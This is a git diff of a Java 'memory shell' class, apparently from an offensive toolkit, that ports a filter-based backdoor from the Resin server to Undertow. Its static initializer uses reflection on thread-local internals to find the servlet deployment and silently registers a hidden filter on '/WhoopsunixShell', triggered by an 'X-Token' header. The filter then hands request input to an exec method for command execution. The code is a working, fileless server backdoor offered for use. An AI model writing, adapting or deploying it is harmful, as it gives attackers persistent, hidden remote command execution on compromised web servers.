@@ -1,4 +1,4 @@
-package org.example.memshell;
+package com.example.undertow.memshell;
 
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
@@ -11,86 +11,87 @@ import java.util.HashMap;
 /**
  * @author Whoopsunix
  */
-public class ResinFilterExecMS implements Filter {
+public class UndertowFilterExecMS implements Filter {
     private static String NAME = "Whoopsunix";
     private static String PATTERN = "/WhoopsunixShell";
     private static String HEADER = "X-Token";
 
-
     static {
         try {
-            ResinFilterExecMS resinFilterExecMS = new ResinFilterExecMS();
+            UndertowFilterExecMS undertowFilterExecMS = new UndertowFilterExecMS();
 
-            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
+            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
+            Object[] table = (Object[]) getFieldValue(threadLocals, "table");
 
-            for (int i = 0; i < threads.length; i++) {
+            for (int i = 0; i < table.length; i++) {
+                Object entry = table[i];
+                if (entry == null)
+                    continue;
+                Object value = getFieldValue(entry, "value");
+                if (value == null)
+                    continue;
+
                 try {
-                    Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
-                    Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
-                    Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
-                    if (webapp == null)
-                        continue;
-
-                    if (isInject(webapp, resinFilterExecMS)) {
-                        break;
+                    if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
+                        if (isInject(value, undertowFilterExecMS)) {
+                            break;
+                        }
+                        inject(value, undertowFilterExecMS);
                     }
-
-                    inject(webapp, resinFilterExecMS);
-
                 } catch (Exception e) {
-
+                    
                 }
             }
         } catch (Exception e) {
+            
         }
     }
 
-    public static boolean isInject(Object webapp, Object object) {
-        try {
-
+    public static boolean isInject(Object servletRequestContext, Object object) {
+        try{
             String NAME = (String) getFieldValue(object, "NAME");
-            Object _filterManager = getFieldValue(webapp, "_filterManager");
-            HashMap _filters = (HashMap) getFieldValue(_filterManager, "_filters");
-            if (_filters.containsKey(NAME)) {
+            Object deployment = getFieldValue(servletRequestContext, "deployment");
+            Object filters = getFieldValue(deployment, "filters");
+            HashMap result = (HashMap) invokeMethod(filters, "getFilters", new Class[]{}, new Object[]{});
+            if (result.containsKey(NAME)){
                 return true;
             }
-            HashMap _urlPatterns = (HashMap) getFieldValue(_filterManager, "_urlPatterns");
-            if (_urlPatterns.containsKey(NAME)) {
-                return true;
-            }
-            HashMap _instances = (HashMap) getFieldValue(_filterManager, "_instances");
-            if (_instances.containsKey(NAME)) {
-                return true;
-            }
+        }catch (Exception e){
 
-        } catch (Exception e) {
-            
         }
 
         return false;
     }
 
-    public static void inject(Object webapp, Object object) {
+    public static void inject(Object servletRequestContext, Object object) {
         try {
             String NAME = (String) getFieldValue(object, "NAME");
             String PATTERN = (String) getFieldValue(object, "PATTERN");
+            Object deployment = getFieldValue(servletRequestContext, "deployment");
+            Object deploymentInfo = getFieldValue(deployment, "deploymentInfo");
+            Object filterInfo = Class.forName("io.undertow.servlet.api.FilterInfo").getConstructor(String.class, Class.class).newInstance(NAME, object.getClass());
+            invokeMethod(deploymentInfo, "addFilter", new Class[]{Class.forName("io.undertow.servlet.api.FilterInfo")}, new Object[]{filterInfo});
+            invokeMethod(deploymentInfo, "addFilterUrlMapping", new Class[]{String.class, String.class, DispatcherType.class}, new Object[]{NAME, PATTERN, DispatcherType.REQUEST});
+            Object filters = getFieldValue(deployment, "filters");
+            invokeMethod(filters, "addFilter", new Class[]{Class.forName("io.undertow.servlet.api.FilterInfo")}, new Object[]{filterInfo});
 
-            Object filterMapping = Class.forName("com.caucho.server.dispatch.FilterMapping").newInstance();
-            invokeMethod(filterMapping, "setFilterClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
-            invokeMethod(filterMapping, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
-
-            Object urlPattern = invokeMethod(filterMapping, "createUrlPattern", new Class[]{}, new Object[]{});
-            invokeMethod(urlPattern, "addText", new Class[]{String.class}, new Object[]{PATTERN});
-            invokeMethod(webapp, "addFilterMapping", new Class[]{Class.forName("com.caucho.server.dispatch.FilterMapping")}, new Object[]{filterMapping});
+//            // todo 是否要添加响应头标记注入成功
+//            Object response = getFieldValue(servletRequestContext, "originalResponse");
+//            // public void setStatus(final int sc) {
+//            invokeMethod(response, "setStatus", new Class[]{int.class}, new Object[]{200});
+//            // public void addHeader(final String name, final String value) {
+//            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{"ok", "fine"});
 
         } catch (Exception e) {
             
         }
     }
 
+
     public void init(FilterConfig filterConfig) throws ServletException {
 
     }
+
 
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
@@ -105,9 +106,12 @@ public class ResinFilterExecMS implements Filter {
         } catch (Exception e) {
 
         }
+
     }
 
+
     public void destroy() {
+
     }
 
     public static String exec(String str) {
